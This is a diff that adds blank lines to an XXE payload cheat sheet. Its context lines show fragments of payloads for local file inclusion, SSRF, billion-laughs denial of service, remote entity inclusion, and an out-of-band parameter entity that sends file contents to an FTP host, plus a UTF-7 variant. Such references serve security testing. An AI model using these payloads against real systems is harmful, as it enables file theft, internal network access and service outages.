@@ -1,4 +1,5 @@
 **LFI Test**
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
@@ -7,6 +8,7 @@
 ```
 
 **Blind LFI test (when first case doesn't return anything)**
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -16,6 +18,7 @@
 ```
 
 **Access Control bypass (loading restricted resources - PHP example)**
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -24,6 +27,7 @@
 ```
 
 **SSRF Test**
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
@@ -32,6 +36,7 @@
 ```
 
 **XEE (XML Entity Expansion - DOS)**
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -51,12 +56,14 @@
 ```
 
 **XEE #2 (Remote attack - through external xml inclusion)**
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
 <!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
 <lolz><lol>3..2..1...&test<lol></lolz>
 ```
+
 **XXE FTP HTTP Server**
 
 https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
@@ -75,7 +82,9 @@ File stored on http://publicServer.com/parameterEntity_sendftp.dtd
 <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
 %param1;
 ```
+
 **XXE UTF-7**
+
 ```
 <?xml version="1.0" encoding="UTF-7"?>
 +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
